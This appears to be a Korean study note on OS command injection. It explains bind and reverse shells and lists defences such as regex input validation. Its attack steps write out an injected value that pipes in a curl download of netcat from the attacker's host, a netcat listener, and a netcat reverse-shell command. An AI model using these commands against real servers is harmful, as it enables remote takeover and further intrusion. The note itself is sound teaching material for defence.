---
CMDS: Security
관련 문서:
  - "[[109 Security]]"
tags:
  - "#OS_Command_Injection"
---
## OS Command Injection

<center><i>시스템 명령어를 주입하는 공격</i></center>

웹 서비스에서 시스템 명령에 직접 접근할 일이 굉장히 한정적이기 때문에 SQL Injection보다 치명적이지만, 크게 주목받지 않음

  

#### 공격 원리
    
    → 사용자 입력 값에 추가 시스템 명령어를 입력해 공격 시행
	

- Bind-Shell → 정방향 연결
	- 클라이언트에서 서버에 요청을 해서 서버가 응답하는 방식
- Reverse-Shell → 역방향 연결
	- 서버에서 클라이언트에게 요청을 해서 클라이언트가 응답하는 방식

  

netcat 프로그램을 이용해서 reverse shell을 가능하게 만듦

3) Netcat을 서버에 업로드

→ 127.0.0.1|curl -o board.exe http://192.168.0.200/board.exe

4) 공격자 PC Netcat 리스닝

→nc.exe -lvp 9999

5) 웹 서버 Netcat 명령어 실행을 통한 Reverse Shell 연결

→ nc.exe [Hacker IP] [Port] -e [Shell]

  

이후 해커가 하는 일
	→ 네트워크 정보 획득
	→ 수집한 정보를 토대로 다른 서버 침투 (DB)

  
#### 대응방안
1. 서버 사이드 스크립트로 기능 구현
2. 사용자 입력 값 형식에 따른 정규 표현식 검증
    - 정규 표현식 사용 ( pattern.matches, preg_match )
3. 악의적인 문자 검증
    - 정규 표현식으로 악의적인 기능이 가능한 특수문자 (&,`,| 등)를 사용 못하도록 함
4. 기능 제거